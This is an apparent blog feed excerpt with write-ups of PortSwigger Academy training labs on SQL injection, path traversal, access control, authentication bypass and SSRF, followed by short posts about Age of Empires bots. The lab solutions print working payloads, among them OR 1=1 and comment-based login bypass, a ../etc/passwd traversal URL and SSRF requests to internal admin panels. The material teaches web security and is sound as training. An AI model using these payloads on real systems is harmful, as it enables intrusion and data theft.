&lt;p&gt;&lt;strong&gt;Retrieving hidden data&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Imagine a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:
https://insecure-website.com/products?category=Gifts&lt;/p&gt;
&lt;p&gt;This causes the application to make a SQL query to retrieve details of the relevant products from the database:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT * FROM products WHERE category = &apos;Gifts&apos; AND released = 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This SQL query asks the database to return:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;all details (*)
from the products table
where the category is Gifts
and released is 1.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The restriction released = 1 is being used to hide products that are not released. We could assume for unreleased products, released = 0.&lt;/p&gt;
&lt;p&gt;The application doesn&apos;t implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:
https://insecure-website.com/products?category=Gifts&apos;--&lt;/p&gt;
&lt;p&gt;This results in the SQL query:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT * FROM products WHERE category = &apos;Gifts&apos;--&apos; AND released = 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Crucially, note that -- is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes AND released = 1. As a result, all products are displayed, including those that are not yet released.&lt;/p&gt;
&lt;p&gt;You can use a similar attack to cause the application to display all the products in any category, including categories that they don&apos;t know about:
https://insecure-website.com/products?category=Gifts&apos;+OR+1=1--&lt;/p&gt;
&lt;p&gt;This results in the SQL query:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT * FROM products WHERE category = &apos;Gifts&apos; OR 1=1--&apos; AND released = 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The modified query returns all items where either the category is Gifts, or 1 is equal to 1. As 1=1 is always true, the query returns all items.&lt;/p&gt;
&lt;h4&gt;Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data&lt;/h4&gt;
&lt;p&gt;This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT * FROM products WHERE category = &apos;Gifts&apos; AND released = 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.&lt;/p&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;We use &apos;+OR+1=1-- to display all the products in any category.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Subverting application logic&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Imagine an application that lets users log in with a username and password. If a user submits the username wiener and the password bluecheese, the application checks the credentials by performing the following SQL query:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE username = &apos;wiener&apos; AND password = &apos;bluecheese&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.&lt;/p&gt;
&lt;p&gt;In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator&apos;-- and a blank password results in the following query:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE username = &apos;administrator&apos;--&apos; AND password = &apos;&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This query returns the user whose username is administrator and successfully logs the attacker in as that user.&lt;/p&gt;
&lt;h3&gt;Lab: SQL injection vulnerability allowing login bypass&lt;/h3&gt;
&lt;p&gt;This lab contains a SQL injection vulnerability in the login function.&lt;/p&gt;
&lt;p&gt;To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.&lt;/p&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;We go to the login page, intercept the login request, and change&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;csrf=aLvfTFtmCYEfNMxAynub1RDtHZGdecNG&amp;amp;username=sdfsdf&amp;amp;password=sdfsdf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;for&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;csrf=aLvfTFtmCYEfNMxAynub1RDtHZGdecNG&amp;amp;username=sdfsdf&apos;--&amp;amp;password=sdfsdf
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>PortSwigger Academy - Server-side vulnerabilities (Part 1).</title><link>https://alan.com.ar/posts/portswiggeracademyp1/</link><guid isPermaLink="true">https://alan.com.ar/posts/portswiggeracademyp1/</guid><pubDate>Tue, 24 Jun 2025 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This learning path introduces you to a range of common server-side vulnerabilities. This is perfect if you&apos;re new to web security and want to get an overview of the kinds of vulnerabilities that exist, as well as how an attacker might identify and exploit them in real-world systems.&lt;/p&gt;
&lt;h2&gt;Attacks:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;/posts/portswiggeracademyp1/#path-traversal&quot;&gt;Path traversal&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/posts/portswiggeracademyp1/#access-control&quot;&gt;Access control&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/posts/portswiggeracademyp1/#authentication-vulnerabilities&quot;&gt;Authentication&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/posts/portswiggeracademyp1/#server-side-request-forgery-ssrf&quot;&gt;Server-side request forgery (SSRF)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;File upload vulnerabilities (Part 2)&lt;/li&gt;
&lt;li&gt;OS command injection (Part 2)&lt;/li&gt;
&lt;li&gt;SQL injection (Part 2)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Go to &lt;a href=&quot;/posts/portswiggeracademyp2/&quot;&gt;part 2&lt;/a&gt;.&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Path traversal&lt;/h3&gt;
&lt;p&gt;Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Application code and data.
Credentials for back-end systems.
Sensitive operating system files.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.&lt;/p&gt;
&lt;p&gt;For instance, we have:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&quot;/loadImage?filename=218.png&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The image files are stored on disk in the location /var/www/images/.&lt;/p&gt;
&lt;p&gt;This application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the /etc/passwd file from the server&apos;s filesystem:
https://insecure-website.com/loadImage?filename=../../../etc/passwd&lt;/p&gt;
&lt;p&gt;The sequence ../ is valid within a file path, and means to step up one level in the directory structure. The three consecutive ../ sequences step up from /var/www/images/ to the filesystem root, and so the file that is actually read is:
/etc/passwd&lt;/p&gt;
&lt;h4&gt;LAB:&lt;/h4&gt;
&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images.
To solve the lab, retrieve the contents of the /etc/passwd file.&lt;/p&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;To solve this, I started by right-clicking an image to grab its source URL. That gave me something like:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0aaf00eb033990da81ca5247006800a9.web-security-academy.net/image?filename=8.jpg
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then, I just kept adding ../ to the filename parameter a few times until I found the directory I was looking for.&lt;/p&gt;
&lt;p&gt;The solution ended up being:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://0aaf00eb033990da81ca5247006800a9.web-security-academy.net/image?filename=../../../etc/passwd
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h3&gt;Access control&lt;/h3&gt;
&lt;p&gt;Access control is the application of constraints on who or what is authorized to perform actions or access resources. In the context of web applications, access control is dependent on authentication and session management:&lt;/p&gt;
&lt;p&gt;Authentication confirms that the user is who they say they are.
Session management identifies which subsequent HTTP requests are being made by that same user.
Access control determines whether the user is allowed to carry out the action that they are attempting to perform.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vertical privilege escalation&lt;/strong&gt;
If a user can gain access to functionality that they are not permitted to access then this is vertical privilege escalation. For example, if a non-administrative user can gain access to an admin page where they can delete user accounts, then this is vertical privilege escalation.&lt;/p&gt;
&lt;p&gt;At its most basic, vertical privilege escalation arises where an application does not enforce any protection for sensitive functionality. For example, administrative functions might be linked from an administrator&apos;s welcome page but not from a user&apos;s welcome page. However, a user might be able to access the administrative functions by browsing to the relevant admin URL.&lt;/p&gt;
&lt;p&gt;For example, a website might host sensitive functionality at the following URL:
https://insecure-website.com/admin
This might be accessible by any user, not only administrative users who have a link to the functionality in their user interface. In some cases, the administrative URL might be disclosed in other locations, such as the robots.txt file:
https://insecure-website.com/robots.txt&lt;/p&gt;
&lt;p&gt;Even if the URL isn&apos;t disclosed anywhere, an attacker may be able to use a wordlist to brute-force the location of the sensitive functionality.&lt;/p&gt;
&lt;h4&gt;LAB: Unprotected admin functionality&lt;/h4&gt;
&lt;p&gt;This lab has an unprotected admin panel.
Solve the lab by deleting the user carlos.&lt;/p&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;I found the /administrator-panel by checking /robots.txt.
Turns out, you can delete users from there.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;Unprotected functionality - Continued&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In some cases, sensitive functionality is concealed by giving it a less predictable URL. This is an example of so-called &quot;security by obscurity&quot;. However, hiding sensitive functionality does not provide effective access control because users might discover the obfuscated URL in a number of ways.&lt;/p&gt;
&lt;p&gt;Imagine an application that hosts administrative functions at the following URL:
https://insecure-website.com/administrator-panel-yb556
This might not be directly guessable by an attacker. However, the application might still leak the URL to users. The URL might be disclosed in JavaScript that constructs the user interface based on the user&apos;s role:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    &amp;lt;script&amp;gt;
    	var isAdmin = false;
    	if (isAdmin) {
    		...
    		var adminPanelTag = document.createElement(&apos;a&apos;);
    		adminPanelTag.setAttribute(&apos;href&apos;, &apos;https://insecure-website.com/administrator-panel-yb556&apos;);
    		adminPanelTag.innerText = &apos;Admin panel&apos;;
    		...
    	}
    &amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;Lab: Unprotected admin functionality with unpredictable URL&lt;/h4&gt;
&lt;p&gt;This lab has an unprotected admin panel. It&apos;s located at an unpredictable location, but the location is disclosed somewhere in the application.&lt;/p&gt;
&lt;p&gt;Solve the lab by accessing the admin panel, and using it to delete the user carlos.&lt;/p&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;I found the admin panel directory by viewing the page&apos;s source code. Inside, there was a JavaScript snippet:
JavaScript&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
if (isAdmin) {
    var topLinksTag = document.getElementsByClassName(&quot;top-links&quot;)[0];
    var adminPanelTag = document.createElement(&apos;a&apos;);
    adminPanelTag.setAttribute(&apos;href&apos;, &apos;/admin-6qx1ng&apos;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I used /admin-6qx1ng to get into the admin panel.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;Parameter-based access control methods&lt;/strong&gt;
Some applications determine the user&apos;s access rights or role at login, and then store this information in a user-controllable location. This could be:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A hidden field.&lt;/li&gt;
&lt;li&gt;A cookie.&lt;/li&gt;
&lt;li&gt;A preset query string parameter.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The application makes access control decisions based on the submitted value. For example:
https://insecure-website.com/login/home.jsp?admin=true
https://insecure-website.com/login/home.jsp?role=1&lt;/p&gt;
&lt;p&gt;This approach is insecure because a user can modify the value and access functionality they&apos;re not authorized to, such as administrative functions.&lt;/p&gt;
&lt;h4&gt;Lab:&lt;/h4&gt;
&lt;p&gt;This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.
Solve the lab by accessing the admin panel and using it to delete the user carlos.
You can log in to your own account using the following credentials: wiener:peter&lt;/p&gt;
&lt;h4&gt;Solution;&lt;/h4&gt;
&lt;p&gt;I used the browser&apos;s developer tools to grab the cookie. Then, in Burp Suite&apos;s Repeater, I sent a new request and changed the admin cookie&apos;s value from false to true. After rendering the response and reading the raw output, I discovered that deleting an account was done via:&lt;/p&gt;
&lt;p&gt;GET /admin/delete?username=carlos&lt;/p&gt;
&lt;p&gt;So, I sent that request to delete the user.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;Horizontal privilege escalation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Horizontal privilege escalation occurs if a user is able to gain access to resources belonging to another user, instead of their own resources of that type. For example, if an employee can access the records of other employees as well as their own, then this is horizontal privilege escalation.&lt;/p&gt;
&lt;p&gt;Horizontal privilege escalation attacks may use similar types of exploit methods to vertical privilege escalation. For example, a user might access their own account page using the following URL:
https://insecure-website.com/myaccount?id=123&lt;/p&gt;
&lt;h4&gt;LAB:&lt;/h4&gt;
&lt;p&gt;This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.&lt;/p&gt;
&lt;p&gt;To solve the lab, find the GUID for carlos, then submit his API key as the solution.&lt;/p&gt;
&lt;p&gt;You can log in to your own account using the following credentials: wiener:peter&lt;/p&gt;
&lt;p&gt;profile page is
https://0abb008404111cbd80214eba008300f1.web-security-academy.net/my-account?id=lalalal&lt;/p&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;In the blog we can see who is the author of each post. Their profile webaddress gives their id. So we can replace our ID for their&apos;s.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;Horizontal to vertical privilege escalation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Often, a horizontal privilege escalation attack can be turned into a vertical privilege escalation, by compromising a more privileged user. For example, a horizontal escalation might allow an attacker to reset or capture the password belonging to another user. If the attacker targets an administrative user and compromises their account, then they can gain administrative access and so perform vertical privilege escalation.&lt;/p&gt;
&lt;p&gt;An attacker might be able to gain access to another user&apos;s account page using the parameter tampering technique already described for horizontal privilege escalation:
https://insecure-website.com/myaccount?id=456&lt;/p&gt;
&lt;p&gt;If the target user is an application administrator, then the attacker will gain access to an administrative account page. This page might disclose the administrator&apos;s password or provide a means of changing it, or might provide direct access to privileged functionality.&lt;/p&gt;
&lt;h4&gt;LAB:&lt;/h4&gt;
&lt;p&gt;This lab has user account page that contains the current user&apos;s existing password, prefilled in a masked input.
To solve the lab, retrieve the administrator&apos;s password, then use it to delete the user carlos.
You can log in to your own account using the following credentials: wiener:peter&lt;/p&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;In https://0afa00d704bc20c0cef51719002200c7.web-security-academy.net/my-account?id=wiener we change our username for &quot;administrator&quot;. There we can read the password.&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Authentication vulnerabilities&lt;/h3&gt;
&lt;p&gt;Conceptually, authentication vulnerabilities are easy to understand. However, they are usually critical because of the clear relationship between authentication and security.&lt;/p&gt;
&lt;p&gt;Authentication vulnerabilities can allow attackers to gain access to sensitive data and functionality. They also expose additional attack surface for further exploits. For this reason, it&apos;s important to learn how to identify and exploit authentication vulnerabilities, and how to bypass common protection measures.&lt;/p&gt;
&lt;p&gt;In this section, we explain:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The most common authentication mechanisms used by websites.&lt;/li&gt;
&lt;li&gt;Potential vulnerabilities in these mechanisms.&lt;/li&gt;
&lt;li&gt;Inherent vulnerabilities in different authentication mechanisms.&lt;/li&gt;
&lt;li&gt;Typical vulnerabilities that are introduced by their improper implementation.&lt;/li&gt;
&lt;li&gt;How you can make your own authentication mechanisms as robust as possible.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;What is the difference between authentication and authorization?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Authentication is the process of verifying that a user is who they claim to be. Authorization involves verifying whether a user is allowed to do something.&lt;/p&gt;
&lt;p&gt;For example, authentication determines whether someone attempting to access a website with the username Carlos123 really is the same person who created the account.&lt;/p&gt;
&lt;p&gt;Once Carlos123 is authenticated, their permissions determine what they are authorized to do. For example, they may be authorized to access personal information about other users, or perform actions such as deleting another user&apos;s account.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Brute-force attacks&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A brute-force attack is when an attacker uses a system of trial and error to guess valid user credentials. These attacks are typically automated using wordlists of usernames and passwords. Automating this process, especially using dedicated tools, potentially enables an attacker to make vast numbers of login attempts at high speed.&lt;/p&gt;
&lt;p&gt;Brute-forcing is not always just a case of making completely random guesses at usernames and passwords. By also using basic logic or publicly available knowledge, attackers can fine-tune brute-force attacks to make much more educated guesses.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Brute-forcing usernames&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Usernames are especially easy to guess if they conform to a recognizable pattern, such as an email address. For example, it is very common to see business logins in the format firstname.lastname@somecompany.com. However, even if there is no obvious pattern, sometimes even high-privileged accounts are created using predictable usernames, such as admin or administrator.&lt;/p&gt;
&lt;p&gt;During auditing, check whether the website discloses potential usernames publicly. For example, are you able to access user profiles without logging in? Even if the actual content of the profiles is hidden, the name used in the profile is sometimes the same as the login username. You should also check HTTP responses to see if any email addresses are disclosed. Occasionally, responses contain email addresses of high-privileged users, such as administrators or IT support.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Brute-forcing passwords&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Passwords can similarly be brute-forced, with the difficulty varying based on the strength of the password. Many websites adopt some form of password policy, which forces users to create high-entropy passwords that are, theoretically at least, harder to crack using brute-force alone. This typically involves enforcing passwords with:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A minimum number of characters&lt;/li&gt;
&lt;li&gt;A mixture of lower and uppercase letters&lt;/li&gt;
&lt;li&gt;At least one special character&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Brute-forcing passwords - Continued&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;However, while high-entropy passwords are difficult for computers alone to crack, we can use a basic knowledge of human behavior to exploit the vulnerabilities that users unwittingly introduce to this system. Rather than creating a strong password with a random combination of characters, users often take a password that they can remember and try to crowbar it into fitting the password policy. For example, if &lt;code&gt;mypassword&lt;/code&gt; is not allowed, users may try something like &lt;code&gt;Mypassword1!&lt;/code&gt; or &lt;code&gt;Myp4$$w0rd&lt;/code&gt; instead.&lt;/p&gt;
&lt;p&gt;In cases where the policy requires users to change their passwords on a regular basis, it is also common for users to just make minor, predictable changes to their preferred password. For example, &lt;code&gt;Mypassword1!&lt;/code&gt; becomes &lt;code&gt;Mypassword1?&lt;/code&gt; or &lt;code&gt;Mypassword2!.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This knowledge of likely credentials and predictable patterns means that brute-force attacks can often be much more sophisticated, and therefore effective, than simply iterating through every possible combination of characters.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Username enumeration&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Username enumeration is when an attacker is able to observe changes in the website&apos;s behavior in order to identify whether a given username is valid.&lt;/p&gt;
&lt;p&gt;Username enumeration typically occurs either on the login page, for example, when you enter a valid username but an incorrect password, or on registration forms when you enter a username that is already taken. This greatly reduces the time and effort required to brute-force a login because the attacker is able to quickly generate a shortlist of valid usernames.&lt;/p&gt;
&lt;h4&gt;Lab: Username enumeration via different responses**&lt;/h4&gt;
&lt;p&gt;This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password.
To solve the lab, enumerate a valid username, brute-force this users password, then access their account page.&lt;/p&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;First, I used Burp Suite&apos;s proxy to intercept the request headers and content.&lt;/p&gt;
&lt;p&gt;Then, I switched to Burp Intruder to perform a brute-force attack. I started by testing a list of usernames. I looked for an outlier response, which indicated a valid username. Once I had a valid username, I repeated the process with a list of passwords until I found the correct one.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;images/PortSwiggerAcademyP1/burp1.png&quot; alt=&quot;burp&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bypassing two-factor authentication&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;At times, the implementation of two-factor authentication is flawed to the point where it can be bypassed entirely.&lt;/p&gt;
&lt;p&gt;If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a &quot;logged in&quot; state before they have entered the verification code. In this case, it is worth testing to see if you can directly skip to &quot;logged-in only&quot; pages after completing the first authentication step. Occasionally, you will find that a website doesn&apos;t actually check whether or not you completed the second step before loading the page.&lt;/p&gt;
&lt;h4&gt;Lab: 2FA simple bypass&lt;/h4&gt;
&lt;p&gt;This lab&apos;s two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user&apos;s 2FA verification code. To solve the lab, access Carlos&apos;s account page.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Your credentials: wiener:peter&lt;/li&gt;
&lt;li&gt;Victim&apos;s credentials carlos:montoya&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;You can go to the profile page without actually using the 2FA. Just login and then go to the profile page.&lt;/p&gt;
&lt;h3&gt;Server-side request forgery (SSRF)&lt;/h3&gt;
&lt;p&gt;Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.&lt;/p&gt;
&lt;p&gt;In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization&apos;s infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems. This could leak sensitive data, such as authorization credentials.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SSRF attacks against the server&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In an SSRF attack against the server, the attacker causes the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This typically involves supplying a URL with a hostname like 127.0.0.1 (a reserved IP address that points to the loopback adapter) or localhost (a commonly used name for the same adapter).&lt;/p&gt;
&lt;p&gt;For example, imagine a shopping application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs. It does this by passing the URL to the relevant back-end API endpoint via a front-end HTTP request. When a user views the stock status for an item, their browser makes the following request:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.&lt;/p&gt;
&lt;p&gt;In this example, an attacker can modify the request to specify a URL local to the server:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://localhost/admin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The server fetches the contents of the /admin URL and returns it to the user.&lt;/p&gt;
&lt;p&gt;An attacker can visit the /admin URL, but the administrative functionality is normally only accessible to authenticated users. This means an attacker won&apos;t see anything of interest. However, if the request to the /admin URL comes from the local machine, the normal access controls are bypassed. The application grants full access to the administrative functionality, because the request appears to originate from a trusted location.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SSRF attacks against the server - Continued&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Why do applications behave in this way, and implicitly trust requests that come from the local machine? This can arise for various reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The access control check might be implemented in a different component that sits in front of the application server. When a connection is made back to the server, the check is bypassed.&lt;/li&gt;
&lt;li&gt;For disaster recovery purposes, the application might allow administrative access without logging in, to any user coming from the local machine. This provides a way for an administrator to recover the system if they lose their credentials. This assumes that only a fully trusted user would come directly from the server.&lt;/li&gt;
&lt;li&gt;The administrative interface might listen on a different port number to the main application, and might not be reachable directly by users.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, often make SSRF into a critical vulnerability.&lt;/p&gt;
&lt;h4&gt;Lab: Basic SSRF against the local server&lt;/h4&gt;
&lt;p&gt;This lab has a stock check feature which fetches data from an internal system.&lt;/p&gt;
&lt;p&gt;To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.&lt;/p&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;I used Burp Suite&apos;s Intercept feature to capture the stock checking request. Then, I sent this request to Burp Intruder.&lt;/p&gt;
&lt;p&gt;In Intruder, I modified the stock API endpoint to http://localhost/admin. This allowed me to access the admin panel.&lt;/p&gt;
&lt;p&gt;The response from this modified request revealed the full URL to delete the user &apos;carlos&apos;:&lt;/p&gt;
&lt;p&gt;https://0a5700df037fdba882b5ab1e005a00d4.web-security-academy.net/admin/delete?username=carlos&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SSRF attacks against other back-end systems&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In some cases, the application server is able to interact with back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses. The back-end systems are normally protected by the network topology, so they often have a weaker security posture. In many cases, internal back-end systems contain sensitive functionality that can be accessed without authentication by anyone who is able to interact with the systems.&lt;/p&gt;
&lt;p&gt;In the previous example, imagine there is an administrative interface at the back-end URL https://192.168.0.68/admin. An attacker can submit the following request to exploit the SSRF vulnerability, and access the administrative interface:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://192.168.0.68/admin
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;Lab: Basic SSRF against another back-end system&lt;/h4&gt;
&lt;p&gt;This lab has a stock check feature which fetches data from an internal system.&lt;/p&gt;
&lt;p&gt;To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.&lt;/p&gt;
&lt;h4&gt;Solution:&lt;/h4&gt;
&lt;p&gt;I used Burp Intruder to find the correct internal IP address for the admin panel. I set the stockApi parameter to http://192.168.0.X:8080/admin/, and then I configured Intruder to iterate the X value from 1 to 255.&lt;/p&gt;
&lt;p&gt;Once I identified the correct X (which turned out to be 208), the full request used to delete the username &apos;carlos&apos; was:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;stockApi=http://192.168.0.208:8080/admin/delete?username=carlos&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded></item><item><title>Age Of Empires Bluesky and Telegram bots (Python script).</title><link>https://alan.com.ar/posts/aoebots/</link><guid isPermaLink="true">https://alan.com.ar/posts/aoebots/</guid><pubDate>Fri, 20 Jun 2025 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the GitHub repositories:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;::github{repo=&quot;athekat/aoetelegrambot&quot;}
::github{repo=&quot;athekat/aoebskybot&quot;}&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;And the &lt;a href=&quot;https://bsky.app/profile/aoeboto.bsky.social/&quot;&gt;bsky profile&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;These Python scripts gets a list of players to monitor and send a message (via a Telegram Bot or a Bluesky account) when one of those players are either playing or stopped playing.&lt;/p&gt;
&lt;p&gt;This scripts are run by &lt;a href=&quot;https://github.com/features/actions&quot;&gt;Github Actions&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Telegram bot is made using &lt;a href=&quot;https://core.telegram.org/bots/tutorial&quot;&gt;BotFather&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Requirements&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;atproto (For Bsky usage)&lt;/li&gt;
&lt;li&gt;telegram&lt;/li&gt;
&lt;li&gt;pytz (For time conversion)&lt;/li&gt;
&lt;/ul&gt;
</content:encoded></item><item><title>Age Of Empires II - Idle TC Alert (Python Script).</title><link>https://alan.com.ar/posts/aoeidletcalert/</link><guid isPermaLink="true">https://alan.com.ar/posts/aoeidletcalert/</guid><pubDate>Thu, 05 Jun 2025 03:56:54 GMT</pubDate><content:encoded>&lt;p&gt;::github{repo=&quot;athekat/aoe-idletc.py&quot;}&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/athekat/aoe-idletc.py/&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Context&lt;/h2&gt;
&lt;p&gt;In Age of Empires II, it is essential to maintain a steady production of villagers (workers who gather resources to boost your economy and produce other units). Even though there&apos;s a production line at the top of the screen, in the heat of battles one can neglect that aspect and forget to keep producing villagers.
